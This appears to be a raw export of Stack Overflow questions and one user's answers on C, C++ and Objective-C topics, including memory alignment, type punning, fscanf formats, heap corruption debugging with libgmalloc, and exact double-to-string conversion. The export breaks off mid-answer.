<p>This will print out the socket options with a <code>SO=</code>, among other information.  Note that if no options are set, you'll get the empty string, so you'll see something like <code>SO=PQLEN=0</code> etc.  To test for <code>SO_BROADCAST</code>, just grep for the string <code>SO_BROADCAST</code> after the <code>SO=</code>, e.g.</p>

<pre><code>if lsof -a -p PID -d FD -T f | grep -q 'SO=[^=]*SO_BROADCAST'; then
    # socket has SO_BROADCAST
else
    # it doesn't
fi
</code></pre>
"
"<p>You can put a link to comparison matrix or lists of extensions available to main compilers. If none of this is available, you could write a list of extension you use or like in your favorite compiler.</p>
","9530","","<p>A number of compilers allow anonymous structs inside anonymous unions, which is useful for some things, e.g.:</p>

<pre><code>struct vector3
{
    union
    {
        struct
        {
            float x, y, z;
        };
        float v[3];
    };
};

// members can now be accessed by name or by index:
vector3 v;
v.x = 1.0f; v.y = 2.0f; v.z = 3.0f;
v.v[0] = v.v[1] = v.v[2] = 0.0f;
</code></pre>
"
"<p>I am trying to do something like this:</p>

<pre><code>for ( std::list&lt; Cursor::Enum &gt;::reverse_iterator i = m_CursorStack.rbegin(); i != m_CursorStack.rend(); ++i )
{
    if ( *i == pCursor )
    {
        m_CursorStack.erase( i );
        break;
    }
}
</code></pre>

<p>However erase takes an iterator and not a reverse iterator. is there a way to convert a reverse iterator to a regular iterator or another way to remove this element from the list?</p>
","9530","","<p>While using the <code>reverse_iterator</code>'s <code>base()</code> method and decrementing the result works here, it's worth noting that <code>reverse_iterator</code>s are not given the same status as regular <code>iterator</code>s.  In general, you should prefer regular <code>iterator</code>s to <code>reverse_iterator</code>s (as well as to <code>const_iterator</code>s and <code>const_reverse_iterator</code>s), for precisely reasons like this.  See <a href=""http://www.ddj.com/cpp/184401406"" rel=""nofollow"">Doctor Dobbs' Journal</a> for an in-depth discussion of why.</p>
"
"<p>I'm working on an application, I have a NSMutableArray that stores 20 or so sprites. I need to iterate through it fairly quickly and efficiently. The speed for my purposes is not optimal... I'm getting two values from each sprite as it iterates through, would it be more efficient (faster) to iterate through an array of say CGPoints then an array of sprites? Or instead of CGPoint make a custom class for the sole purpose of handling just two integer values. Either way, is speed affected by the type of objects or values stored in an array?</p>
","9530","","<p>The speed of iteration is not affected by what type of data you're storing in the array.  It <em>is</em> affected by the type of array you're using: there are significant differences between iterating through an Objective-C <code>NSArray</code> (or any of its subclasses, such as <code>NSMutableArray</code>), a C-style array, or a C++ <code>std::vector</code>.</p>

<p>If you're using an <code>NSArray</code>, and you're using Objective-C 2.0 (e.g. on the iPhone or on Mac OS X 10.5 or later), you can use <a href=""http://developer.apple.com/library/mac/ipad/#documentation/cocoa/conceptual/ObjectiveC/Chapters/ocFastEnumeration.html"" rel=""nofollow"">fast enumeration</a> to iterate, which is significantly faster than the older style of iteration:</p>

<pre><code>// Fast enumeration
for(id object in myNSArray)
    ;  // do stuff with object

// Slow enumeration
int count = [myNSArray count], i;
for(i = 0; i &lt; count; i++)
{
    id object = [myNSArray objectAtIndex:i];
    // do stuff with object
}
</code></pre>

<p>I'm not sure how fast enumeration compares with C-style arrays or C++ <code>std::vector</code>s, but I would bet that it's still a little bit slower.  It's slower because you have the extra overhead of Objective-C: passing messages (such as <code>count</code> and <code>objectAtIndex:</code>) goes through the Objective-C runtime, which is slower than bare pointer arithmetic even in the best case.</p>

<p>Iterating through a C-style array or a C++ <code>std::vector</code> is very fast, since the compiler can optimize them to really simple pointer arithmetic instructions with no overhead:</p>

<pre><code>// C-style array
SomeType *myArray = ...;  // e.g. malloc(myArraySize * sizeof(SomeType))
int i;
for(i = 0; i &lt; myArraySize; i++)
    ; // do stuff with myArray[i]

// C++ vector
std::vector&lt;SomeType&gt; myArray = ...;
for(std::vector&lt;SomeType&gt;::iterator i = myArray.begin(); i != myArray.end(); ++i)
    ; // do stuff with *i
</code></pre>
"
"<p>I often see code such as the following when, e.g., representing a large bitmap in memory:</p>

<pre><code>size_t width = 1280;
size_t height = 800;
size_t bytesPerPixel = 3;
size_t bytewidth = ((width * bytesPerPixel) + 3) &amp; ~3; /* Aligned to 4 bytes */
uint8_t *pixelData = malloc(bytewidth * height);
</code></pre>

<p>(that is, a bitmap allocated as a contiguous block of memory having a <code>bytewidth</code> aligned to a certain number of bytes, most commonly 4.)</p>

<p>A point on the image is then given via:</p>

<pre><code>pixelData + (bytewidth * y) + (bytesPerPixel * x)
</code></pre>

<p>This leads me to two questions:</p>

<ol>
<li>Does aligning a buffer like this have a performance impact on modern processors? Should I be worrying about alignment at all, or will the compiler handle this?</li>
<li>If it does have an impact, could someone point me to a resource to find the ideal byte alignment for various processors?</li>
</ol>

<p>Thanks.</p>
","9530","","<p>It depends on a lot of factors.  If you're only accessing the pixel data one byte at a time, the alignment will not make any difference the vast majority of the time.  For reading/writing one byte of data, most processors won't care at all whether that byte is on a 4-byte boundary or not.</p>

<p>However, if you're accessing data in units larger than a byte (say, in 2-byte or 4-byte units), then you will definitely see alignment effects.  For some processors (e.g. many RISC processors), it is outright illegal to access unaligned data on certain levels: attempting to read a 4-byte word from an address that's not 4-byte aligned will generate a Data Access Exception (or Data Storage Exception) on a PowerPC, for example.</p>

<p>On other processors (e.g. x86), accessing unaligned addresses is permitted, but it often comes with a hidden performance penalty.  Memory loads/stores are often implemented in microcode, and the microcode will detect the unaligned access.  Normally, the microcode will fetch the proper 4-byte quantity from memory, but if it's not aligned, it will have to fetch <em>two</em> 4-byte locations from memory and reconstruct the desired 4-byte quantity from the appropriate bytes of the two locations.  Fetching two memory locations is obviously slower than one.</p>

<p>That's just for simple loads and stores, though.  Some instructions, such as those in the MMX or SSE instruction sets, require their memory operands to be properly aligned.  If you attempt to access unaligned memory using those special instructions, you'll see something like an illegal instruction exception.</p>

<p>To summarize, I wouldn't really worry too much about alignment unless you're writing super performance-critical code (e.g. in assembly).  The compiler helps you out a lot, e.g. by padding structures so that 4-byte quantities are aligned on 4-byte boundaries, and on x86, the CPU also helps you out when dealing with unaligned accesses.  Since the pixel data you're dealing with is in quantities of 3 bytes, you'll almost always being doing single byte accesses anyways.</p>

<p>If you decide you instead want to access pixels in singular 4-byte accesses (as opposed to 3 1-byte accesses), it would be better to use 32-bit pixels and have each individual pixel aligned on a 4-byte boundary.  Aligning each row to a 4-byte boundary but not each pixel will have little, if any, effect.</p>

<p>Based on your code, I'm guessing it's related to reading the Windows bitmap file format -- bitmap files require the length of each scanline to be a multiple of 4 bytes, so setting up your pixel data buffers with that property has the property that you can just read in the entire bitmap in one fell swoop into your buffer (of course, you still have to deal with the fact that the scanlines are stored bottom-to-top instead of top-to-bottom and that the pixel data is BGR instead of RGB).  This isn't really much of an advantage, though -- it's not that much harder to read in the bitmap one scanline at a time.</p>
"
"<p>I have a unsigned long integer value which represents a float using IEEE-754 format. What is the quickest way of printing it out as a float in C++?</p>

<p>I know one way, but am wondering if there is a convenient utility in C++ that would be better.</p>

<p>Example of the way that I know is:</p>

<pre><code>union
{
    unsigned long ul;
    float f;
} u;

u.ul = 1084227584; // in HEX, this is 0x40A00000

cout &lt;&lt; ""float value is: "" &lt;&lt; u.f &lt;&lt; endl;
</code></pre>

<p>(This prints out ""float value is: 5"" )</p>
","9530","","<p>The union method you suggested is the usual route that most people would take.  However, it's technically <em>undefined behavior</em> in C/C++ to read a different member from a union than the one that was most recently written.  Despite this, though, it's well-supported among pretty much all compilers.</p>

<p>Casting pointers, as <a href=""http://stackoverflow.com/questions/1856468/how-to-output-ieee-754-format-integer-as-a-float/1856476#1856476"">Jon Skeet suggested</a>, is a bad idea -- that violates the <a href=""http://cellperformance.beyond3d.com/articles/2006/06/understanding-strict-aliasing.html"" rel=""nofollow"">strict aliasing</a> rules of C.  An aggressive optimizing compiler will produce incorrect code for this, since it assumes that pointers of types <code>unsigned long *</code> and <code>float *</code> will never alias each other.</p>

<p>The most correct way, in terms of standards compliance (that is, not invoking undefined behavior), is to cast through a <code>char*</code>, since the strict aliasing rules permit a <code>char*</code> pointer to alias a pointer of any other type:</p>

<pre><code>unsigned long ul = 0x40A00000;
float f;
char *pul = (char *)&amp;ul;  // ok, char* can alias any type
char *pf = (char *)&amp;f;    // ok, char* can alias any type
memcpy(pf, pul, sizeof(float));
</code></pre>

<p>Though honestly, I would just go with the union method.  From the cellperformance.com link above:</p>

<blockquote>
  <p>It is an extremely common idiom and is well-supported by all major compilers. As a practical matter, reading and writing to any member of a union, in any order, is acceptable practice.</p>
</blockquote>
"
"<p>first of all please let me say that I am quite new to objective c development. I am writing a small app for personal use for the iphone, but I have some problems executing the following code:</p>

<pre><code>NSString *sql = [[NSString alloc] initWithFormat:@""select color_r, color_g, color_b from Calendar where ROWID = %@"", [calendarsID objectForKey:[arrayColors objectAtIndex:row]]];

sqlite3_stmt *selectstmt;

if(sqlite3_prepare_v2(database, sql, -1, &amp;selectstmt, NULL) == SQLITE_OK)
</code></pre>

<p>The compiler tells me that I am passing argument 2 of sqlite3_prepare_v2 from an incompatible pointer type. The program gets, anyhow, compiled and runs but, when it has to execute the code that I've just shown you, it produces an error. It says that there is a syntax error in the query, and the syntax error is just in the last part of the query. Instead of having:</p>

<p>select color_, color_g, color_b from Calendar where ROWID = 63 (for example)</p>

<p>I get strange characters in the place of the last number (63). I guess this is a problem related to string conversion. Can please anyhone help me?</p>

<p>Thank you very much for your attention.
Alessio</p>
","9530","","<p>The problem is that a <code>NSString</code> is not what <code>sqlite3_prepare_v2()</code> is expecting for its second argument.  It wants a <code>const char*</code>.  C is a little lax here, and it lets you implicitly cast an <code>NSString*</code> to a <code>const char*</code>, which is WRONG -- the compiler is giving you a warning which you shouldn't ignore.</p>

<p>You need to convert the <code>NSString</code> into a <code>const char*</code>.  The simplest way to do this is to use the <a href=""http://developer.apple.com/mac/library/documentation/Cocoa/Reference/Foundation/Classes/NSString%5FClass/Reference/NSString.html#//apple%5Fref/occ/instm/NSString/UTF8String"" rel=""nofollow""><code>-UTF8String</code></a> message to convert it into UTF-8:</p>

<pre><code>//                              V---- HERE ----V
if(sqlite3_prepare_v2(database, [sql UTF8String], -1, &amp;selectstmt, NULL) == SQLITE_OK)
</code></pre>

<p>Alternatively, in the unlikely case that you want to use a different encoding, you can use the <a href=""http://developer.apple.com/mac/library/documentation/Cocoa/Reference/Foundation/Classes/NSString%5FClass/Reference/NSString.html#//apple%5Fref/occ/instm/NSString/cStringUsingEncoding%3A"" rel=""nofollow""><code>-cStringUsingEncoding:</code></a> message to convert the string to a C string using a specific character encoding.</p>
"
"<p>First and foremost, apologies for any cross-posting. Hope I'm not repeating an issue here, but I was unable to find this elsewhere (via Google and Stack Overflow).</p>

<p>Here's the gist of the error. If I call <code>printf</code>, <code>sprintf</code> or <code>fprintf</code> anywhere within my code, to display a float, I get a <code>SIGSEGV (EXC_BAD_ACCESS)</code> error. Let me give an example.</p>

<p>The following throws the error:</p>

<pre><code>float f = 0.5f;
printf(""%f\n"",f);
</code></pre>

<p>This code does not:</p>

<pre><code>float f = 0.5f;
printf(""%d\n"",f);
</code></pre>

<p>I realize there's an implicit conversion there, but I'm not concerned with that. I just can't fathom why printing a float vs. printing an integer would throw an error.</p>

<p><strong>Note:</strong> Part of the code uses <code>malloc</code> to create some very large multidimensional arrays. However, these arrays are <strong>not</strong> being referenced in any way for these print statements. Here's an example how I'm declaring these arrays.</p>

<pre><code>#define X_LEN 20
#define XDOT_LEN 20
#define THETA_LEN 20
#define THETADOT_LEN 20
#define NUM_STATES (X_LEN+1) * (XDOT_LEN+1) * (THETA_LEN+1) * (THETADOT_LEN+1)
#define NUM_ACTS 100

float *states = (float *)malloc(NUM_STATES * sizeof(float));
// as opposed to float states[NUM_STATES] (more memory effecient)


float **q = (float**)malloc(NUM_STATES * sizeof(float*));

for(int i=0; i &lt; NUM_STATES; i++) {
    float *a = (float*)malloc(NUM_ACTS * sizeof(float));
    for(int j=0; j &lt; NUM_ACTS; j++) {
        a[j] = 0.0f;
    }
    q[i] = a;
}
</code></pre>

<p>And then the above <code>printf</code> statements occur later in the code. </p>

<p>The reason I included the <code>malloc</code> stuff is because from what I understand, <code>SIGSEGV</code> is related to poorly formed <code>malloc</code> calls. So, if the array initializations are what's causing the problem, I would like to know:</p>

<ul>
<li>why?</li>
<li>how can I change the <code>malloc</code> code to solve this problem?</li>
</ul>

<p>I've included the crash log generated by OS X, just in case that helps anybody out.</p>

<pre>Process:         pole [5453]
Path:            {REDACTED}
Identifier:      pole
Version:         ??? (???)
Code Type:       X86-64 (Native)
Parent Process:  bash [5441]

Date/Time:       2009-12-08 11:38:38.358 -0600
OS Version:      Mac OS X 10.6.2 (10C540)
Report Version:  6

Interval Since Last Report:          130074 sec
Crashes Since Last Report:           68
Per-App Crashes Since Last Report:   63
Anonymous UUID:                      CA20CF15-8C46-4C85-A793-6C69F9F40140

Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_INVALID_ADDRESS at 0x0000000100074f3b
Crashed Thread:  0  Dispatch queue: com.apple.main-thread

Thread 0 Crashed:  Dispatch queue: com.apple.main-thread
0   libSystem.B.dylib               0x00007fff828d489e __Balloc_D2A + 164
1   libSystem.B.dylib               0x00007fff828d49b8 __d2b_D2A + 45
2   libSystem.B.dylib               0x00007fff828e8c74 __dtoa + 320
3   libSystem.B.dylib               0x00007fff828aa960 __vfprintf + 4980
4   libSystem.B.dylib               0x00007fff828ec7db vfprintf_l + 111
5   libSystem.B.dylib               0x00007fff828ec75e fprintf + 196
6   pole                            0x00000001000028b5 Balance::sarsa() + 187
7   pole                            0x0000000100002e54 main + 49
8   pole                            0x00000001000010a8 start + 52

Thread 0 crashed with X86 Thread State (64-bit):
  rax: 0x0000000000000001  rbx: 0x000000010042cca0  rcx: 0x000000010042cca8  rdx: 0x0000000100074f3b
  rdi: 0x000000000000000e  rsi: 0x00007fff5fbfecbc  rbp: 0x00007fff5fbfeba0  rsp: 0x00007fff5fbfeb90
   r8: 0x00007fff5fbff0b0   r9: 0x0000000000000000  r10: 0x00000000ffffffff  r11: 0x000000010083a40b
  r12: 0x0000000000000001  r13: 0x00007fff5fbfecb8  r14: 0x00007fff5fbfecbc  r15: 0x000000010000363e
  rip: 0x00007fff828d489e  rfl: 0x0000000000010202  cr2: 0x0000000100074f3b

Binary Images:
       0x100000000 -        0x100003fff +pole ??? (???)  {REDACTED}
    0x7fff5fc00000 -     0x7fff5fc3bdef  dyld 132.1 (???)  /usr/lib/dyld
    0x7fff81697000 -     0x7fff8169bff7  libmathCommon.A.dylib ??? (???)  /usr/lib/system/libmathCommon.A.dylib
    0x7fff8289c000 -     0x7fff82a5aff7  libSystem.B.dylib ??? (???)  /usr/lib/libSystem.B.dylib
    0x7fff83c4c000 -     0x7fff83cc9fef  libstdc++.6.dylib ??? (???)  /usr/lib/libstdc++.6.dylib
    0x7fffffe00000 -     0x7fffffe01fff  libSystem.B.dylib ??? (???)  /usr/lib/libSystem.B.dylib

Model: MacBookPro4,1, BootROM MBP41.00C1.B03, 2 processors, Intel Core 2 Duo, 2.4 GHz, 2 GB, SMC 1.27f2
Graphics: NVIDIA GeForce 8600M GT, GeForce 8600M GT, PCIe, 256 MB
Memory Module: global_name
AirPort: spairport_wireless_card_type_airport_extreme (0x14E4, 0x8C), Broadcom BCM43xx 1.0 (5.10.91.19)
Bluetooth: Version 2.2.4f3, 2 service, 1 devices, 1 incoming serial ports
Network Service: AirPort, AirPort, en1
Serial ATA Device: Hitachi HTS542520K9SA00, 186.31 GB
Parallel ATA Device: MATSHITADVD-R   UJ-867
USB Device: Built-in iSight, 0x05ac  (Apple Inc.), 0x8502, 0xfd400000
USB Device: Apple Internal Keyboard / Trackpad, 0x05ac  (Apple Inc.), 0x0230, 0x5d200000
USB Device: IR Receiver, 0x05ac  (Apple Inc.), 0x8242, 0x5d100000
USB Device: BRCM2046 Hub, 0x0a5c  (Broadcom Corp.), 0x4500, 0x1a100000
USB Device: Bluetooth USB Host Controller, 0x05ac  (Apple Inc.), 0x820f, 0x1a110000</pre>

<p>Thanks.</p>
","9530","","<p>You have a bug elsewhere in your code not related to the <code>printf</code> statement.  You're stomping on memory somewhere, but the problem doesn't manifest itself until <code>printf</code> tries to allocate some memory with <code>__BAlloc_D2A</code>, which crashes because the heap data structures it uses to keep track of free memory blocks have been corrupted.</p>

<p>To try to detect where you're stomping on memory, there are a number of tools available.  If you were on Linux, I would suggest using <a href=""http://valgrind.org/"" rel=""nofollow"">valgrind</a>, which essentially runs your code in a virtual machine and tells you whenever you do anything illegal like read/write memory out of bounds, read an uninitialized variable, etc.  However, it's not available in Mac OS X (yet).</p>

<p>One option is to use <a href=""http://developer.apple.com/Mac/library/documentation/Darwin/Reference/ManPages/man3/libgmalloc.3.html"" rel=""nofollow"">libgmalloc</a>:</p>

<pre><code>% cat gmalloctest.c
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

main()
{
  unsigned *buffer = (unsigned *)malloc(sizeof(unsigned) * 100);
  unsigned i;

  for (i = 0; i &lt; 200; i++) {
    buffer[i] = i;
  }

  for (i = 0; i &lt; 200; i++) {
     printf (""%d  "", buffer[i]);
  }
}

% cc -g -o gmalloctest gmalloctest.c
% gdb gmalloctest
Reading symbols for shared libraries .. done
(gdb) set env DYLD_INSERT_LIBRARIES /usr/lib/libgmalloc.dylib
(gdb) r
Starting program: gmalloctest
Reading symbols for shared libraries .. done
GuardMalloc: Allocations will be placed on 16 byte boundaries.
GuardMalloc:  - Some buffer overruns may not be noticed.
GuardMalloc:  - Applications using vector instructions (e.g., SSE or Altivec) should work.
GuardMalloc: GuardMalloc version 19

Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_PROTECTION_FAILURE at address: 0xb000d000
0x00001f65 in main () at gmalloctest.c:10
10          buffer[i] = i;
(gdb) print i
$1 = 100
(gdb) where
#0  0x00001f65 in main () at gmalloctest.c:10
(gdb)
</code></pre>

<p>See also <a href=""http://developer.apple.com/mac/library/documentation/Performance/Conceptual/ManagingMemory/Articles/MallocDebug.html#//apple%5Fref/doc/uid/20001884-CJBJFIDD"" rel=""nofollow"">Enabling the Malloc Debugging Features</a>.</p>
"
"<p>Are the runtime interfaces(such as __objc_exec_class()) for Objective-C programs specified/documented anywhere, or they are (compiler-)implementation defined?</p>

<p>The closest thing to a reference I have found are the GCC headers, but I'd like to know if there is some sort of reference document.</p>
","9530","","<p>The <a href=""http://developer.apple.com/mac/library/documentation/Cocoa/Reference/ObjCRuntimeRef/Reference/reference.html"" rel=""nofollow"">Objective-C Runtime Reference</a> is the best documentation I'm aware of.  See also its companion guides, the <a href=""http://developer.apple.com/mac/library/documentation/Cocoa/Conceptual/ObjCRuntimeGuide/index.html#//apple%5Fref/doc/uid/TP40008048"" rel=""nofollow"">Objective-C Runtime Programming Guide</a> and <a href=""http://developer.apple.com/mac/library/documentation/Cocoa/Conceptual/ObjectiveC/index.html#//apple%5Fref/doc/uid/TP30001163"" rel=""nofollow"">The Objective-C Programming Language</a>.</p>
"
"<p>I have a struct:</p>

<pre><code>typedef struct _n
{
    int type;
    union {
        char *s;
        int i;
    };
} n;
</code></pre>

<p>When I try to assign a compound literal, like:</p>

<pre><code>node n1 = {1, 0};
node n2 = {2, ""test""};
</code></pre>

<p>gcc gives me some warnings such as:</p>

<pre><code>warning: initialization makes pointer from integer without a cast
warning: initialization from incompatible pointer type
</code></pre>

<p>Well, it's clear that the compiler isn't sure about me just assigning a value to a possibly ambiguous type.  However, even if I try to specify more precisely:</p>

<pre><code>node n0 = {type: 1, i: 4};
</code></pre>

<p>I get:</p>

<pre><code>error: unknown field ‘i’ specified in initializer
</code></pre>

<p>I have read that if I put <code>(union &lt;union name&gt;)</code> before <code>i:</code> then it may work.  However, I prefer having an anonymous union.  Is there a way to do it?</p>
","9530","","<p>Anonymous unions are not standard C -- they are a compiler extension.  I would strongly recommend giving the union a name.  If you insist on using an anonymous union, then you can only give an initializer for the first element of it:</p>

<pre><code>node n0 = {1, 0};  // initializes `s' to 0
</code></pre>

<p>When compiled with <code>-Wall -Wextra -pedantic</code>, gcc gave me the warning ""missing braces around initializer"", which is a valid warning.  The initializer should actually be specified like this:</p>

<pre><code>node n0 = {1, {0}};  // initializes `s' to 0
</code></pre>

<p>Now this only gives a warning that ""ISO C doesn't support unnamed structs/unions"".</p>

<p>If you give the union a name, then you can use a C99 feature called <em>designated initializers</em> to initialize a specific member of the union:</p>

<pre><code>typedef struct
{
    int type;
    union {
        char *s;
        int i;
    } value;
} node;

node n0 = {1, { .s = ""string""; }};
node n1 = {2, { .i = 123; }};
</code></pre>

<p>You need the union to have a name; otherwise, the compiler will complain about the designated initializer inside it.</p>

<p>The syntax you were trying to use <code>node n0 = {type: 1, i: 4}</code> is invalid syntax; it looks like you were trying to use designated initializers.</p>
"
"<p>I'm reading in a .txt file. I'm using fscanf to get the data as it is formatted.
The line I'm having problems with is this:</p>

<pre><code>result = fscanf(fp, ""%s"", ap-&gt;name);
</code></pre>

<p>This is fine until I have a name with a whitespace eg: St Ives
So I use this to read in the white space:</p>

<pre><code>result = fscanf(fp, ""%[^\n]s"", ap-&gt;name);
</code></pre>

<p>However, when I try to read in the first name (with no white space) it just doesn't work and messes up the other fscanf. </p>

<p>But I use the [^\n] it works fine within a different file I'm using. Not sure what is happening.</p>

<p>If I use fgets in the place of the fscanf above I get ""\n"" in the variable.</p>

<p>Edit// </p>

<p>Ok, so if I use: </p>

<pre><code>result = fscanf(fp, ""%s"", ap-&gt;name);
result = fscanf(fp, ""%[^\n]s"", ap-&gt;name);
</code></pre>

<p>This allows me to read in a string with no white space. But When I get a ""name"" with whitespace it doesn't work.</p>
","9530","","<p>One problem with this:</p>

<pre><code>result = fscanf(fp, ""%[^\n]s"", ap-&gt;name);
</code></pre>

<p>is that you have an extra <code>s</code> at the end of your format specifier.  The entire format specifier should just be <code>%[^\n]</code>, which says ""read in a string which consists of characters which are not newlines"".  The extra <code>s</code> is not part of the format specifier, so it's interpreted as a literal: ""read the next character from the input; if it's an ""s"", continue, otherwise fail.""</p>

<p>The extra <code>s</code> doesn't actually hurt you, though.  You know exactly what the next character of input: a newline.  It doesn't match, and input processing stops there, but it doesn't really matter since it's the end of your format specifier.  This would cause problems, though, if you had other format specifiers after this one in the same format string.</p>

<p>The real problem is that you're not consuming the newline: you're only reading in all of the characters <em>up to</em> the newline, but not the newline itself.  To fix that, you should do this:</p>

<pre><code>result = fscanf(fp, ""%[^\n]%*c"", ap-&gt;name);
</code></pre>

<p>The <code>%*c</code> specifier says to read in a character (<code>c</code>), but don't assign it to any variable (<code>*</code>).  If you omitted the <code>*</code>, you would have to pass <code>fscanf()</code> another parameter containing a pointer to a character (a <code>char*</code>), where it would then store the resulting character that it read in.</p>

<p>You could also use <code>%[^\n]\n</code>, but that would also read in any whitespace which followed the newline, which may not be what you want.  When <code>fscanf</code> finds whitespace in its format specifier (a space, newline, or tab), it consumes as much whitespace as it can (i.e. you can think of it consuming the longest string that matches the regular expression <code>[ \t\n]*</code>).</p>

<p>Finally, you should also specify a maximum length to avoid buffer overruns.  You can do this by placing the buffer length in between the <code>%</code> and the <code>[</code>.  For example, if <code>ap-&gt;name</code> is a buffer of 256 characters, you should do this:</p>

<pre><code>result = fscanf(fp, ""%255[^\n]%*c"", ap-&gt;name);
</code></pre>

<p>This works great for statically allocated arrays; unfortunately, if the array is dyamically sized at runtime, there's no easy to way to pass the buffer size to <code>fscanf</code>.  You'll have to create the format string with <code>sprintf</code>, e.g.:</p>

<pre><code>char format[256];
snprintf(format, sizeof(format), ""%%%d[^\n]%%*c"", buffer_size - 1);
result = fscanf(fp, format, ap-&gt;name);
</code></pre>
"
"<p>Using Cocoa or basic c, how can I convert a double to a string representation and then convert it back to the exact same double. Readability is not important, only accuracy.
For example, will this work:<br>
    double a,b;<br>
    a=some value;<br>
    b=[[[NSNumber numberWithDouble:a] stringValue] doubleValue];  </p>
","9530","","<p><strong>[EDIT]</strong> Actually there is a way to do this in C99 -- use the <code>%a</code> format specifier.  This prints out a double in hexadecimal scientific notation, so there is no loss of precision.  The result is exact.  Example:</p>

<pre><code>double d1 = 3.14159;
char str[64];
sprintf(str, ""%a"", d1);
// str is now something like ""0x1.921f9f01b866ep+1""
...
double d2;
sscanf(str, ""%la"", &amp;d2);
assert(d2 == d1);
</code></pre>

<p>Original  answer below:</p>

<p><hr></p>

<p>Most double-to-string conversions can't guarantee that.  You can try printing out the double to a very high precision (a double can store about 16 decimal digits), but there's still a small chance of floating-point error:</p>

<pre><code>// Not guaranteed to work:
double d = ...;
char str[64];
sprintf(str, ""%.30g"", d);
...
double d2;
sscanf(str, ""%g"", &amp;d2);
</code></pre>

<p>This will work to a very high degree of precision, but it still may have an error of a few ULPs (units in the last place).</p>

<p>What are you doing that requires you to produce a 100% exactly reproducible value while using a string?  I strongly suggest you reconsider what you're trying to do.  If your really need an exact conversion, just store the double as 8 bytes in binary.  If it needs to be stored in a printable format, convert the binary data into hex (16 bytes) or base 64.</p>
"
"<p>I'm trying to debug a legacy code written for Linux. Sometimes the application gets a segfault when it reaches the memcpy call in the following method:</p>

<pre><code>std::vector&lt;uint8&gt; _storage;
size_t _wpos;
void append(const uint8 *src, size_t cnt)
{
  if (!cnt)
  return;

  if (_storage.size() &lt; _wpos + cnt)
    _storage.resize(_wpos + cnt);
  memcpy(&amp;_storage[_wpos], src, cnt);
  _wpos += cnt;
}
</code></pre>

<p>The values are as follows:</p>

<pre><code>_storage.size() is 1000
_wpos is 0
*src points to an array of uint8 with 3 values: { 3, 110, 20 }
cnt is 3
</code></pre>

<p>I have no idea why this happens since this method gets called thousands of times during the application's runtime but it sometimes gets a segfault.</p>

<p>Any one has any idea how to solve this?</p>
","9530","","<p>Your code looks good in terms of the data that is written.  Are you absolutely sure that you're passing in the right <code>src</code> pointer?  What happens when you run the code with a debugger such as gdb?  It should halt on the segfault, and then you can print out the values of <code>_storage.size()</code>, <code>src</code>, and <code>cnt</code>.</p>

<p>I'm sure you'll find that (at least) one of those is not at all what you're expecting.  You might have passed an invalid <code>src</code>; you might have passed an absurdly large <code>cnt</code>.</p>
"
"<p>(Note: This is <strong>not</strong> a question of how to flush a <code>write()</code>. This is the <em>other end</em> of it, so to speak.)</p>

<p>Is it possible to empty a file descriptor that has data to be read in it <strong>without</strong> having to <code>read()</code> it?  You might not be interested in the data, and reading it all would therefore waste space and cycles you might have better uses for.</p>

<p>If it is not possible in POSIX, do any operating systems have any non-portable ways to do this?</p>

<p><strong>UPDATE:</strong> Please note that I'm talking about <em>file descriptors</em>, <strong>not</strong> streams.</p>
","9530","","<p>For POSIX, use <a href=""http://linux.die.net/man/2/lseek"" rel=""nofollow""><code>lseek(2)</code></a> or <a href=""http://linux.die.net/man/3/lseek64"" rel=""nofollow""><code>lseek64(3)</code></a> to seek ahead.  For Windows, use <a href=""http://msdn.microsoft.com/en-us/library/aa365541%28VS.85%29.aspx"" rel=""nofollow""><code>SetFilePointer()</code></a> or <a href=""http://msdn.microsoft.com/en-us/library/aa365542%28VS.85%29.aspx"" rel=""nofollow""><code>SetFilePointerEx()</code></a>.</p>
"
"<p>What can cause the following error when loading an additional bundle using dlopen:</p>

<pre><code>dlopen($(OBJ_DIR)/Test-20091217211256.ob, 6): no suitable image found.  Did find:
    $(OBJ_DIR)/Test-20091217211256.ob: can't map
</code></pre>

<p>Before this error, the process allocates large amounts of memory.</p>

<p>(Substituted <code>$(OBJ_DIR)</code> in the error for the actual path to make it more legible).</p>
","9530","","<p>One possibility is that the shared library you're trying to open isn't actually a shared library.  Run the <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man1/file.1.html"" rel=""nofollow""><code>file(1)</code></a> program on your library to make sure it's actually a shared library.  It should report something like <code>Mach-O 64-bit dynamically linked shared library x86_64</code> on a 64-bit system or <code>Mach-O dynamically linked shared library i386</code> on a 32-bit system.</p>
"
"<p>Is there an equivalent to <code>getopt()</code> in the visual studio CRT?</p>

<p>Or do I need to get it and compile it with my project?</p>

<p><strong>Edit</strong> clarification<br>
<code>getopt</code> is a utility function in the unix/linux C Run Time library for common command line parsing chores i.e. parsing arguments of the form <code>-a -b</code> <code>-f someArg</code> etc'</p>
","9530","","<p>You can use the <code>getopt</code> implementation from the <a href=""http://www.gnu.org/software/libc/"" rel=""nofollow"">GNU C library</a>.  It's licensed under the LGPL, which should be compatible with most software projects.  See the file <code>posix/getopt.c</code> in the source distribution.</p>
"
"<p>I was reading that Python does all it's ""code blocks"" by indentation, rather than with curly braces. Is that right? So functions, if's and stuff like that all appear without surrounding their block with curly braces?</p>
","9530","","<p>You can try to add support for braces using a <a href=""http://python.org/doc/2.5.2/ref/future.html"">future import</a> statement, but it's not yet supported, so you'll get a syntax error:</p>

<pre><code>&gt;&gt;&gt; from __future__ import braces
  File ""&lt;stdin&gt;"", line 1
SyntaxError: not a chance
</code></pre>
"
"<p>Our server application does a lot of integer tests in a hot code path, currently we use the following function:</p>

<pre><code>inline int IsInteger(double n)
{
    return n-floor(n) &lt; 1e-8
}
</code></pre>

<p>This function is very hot in our workload, so I want it to be as fast as possible. I also want to eliminate the ""floor"" library call if I can. Any suggestions?</p>
","9530","","<p>Here are a couple of answers:</p>

<pre><code>#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;math.h&gt;

int IsInteger1(double n)
{
  union
  {
        uint64_t i;
        double d;
  } u;
  u.d = n;

  int exponent = ((u.i &gt;&gt; 52) &amp; 0x7FF) - 1023;
  uint64_t mantissa = (u.i &amp; 0x000FFFFFFFFFFFFFllu);

  return n == 0.0 ||
        exponent &gt;= 52 ||
        (exponent &gt;= 0 &amp;&amp; (mantissa &lt;&lt; (12 + exponent)) == 0);
}

int IsInteger2(double n)
{
  return n - (double)(int)n == 0.0;
}

int IsInteger3(double n)
{
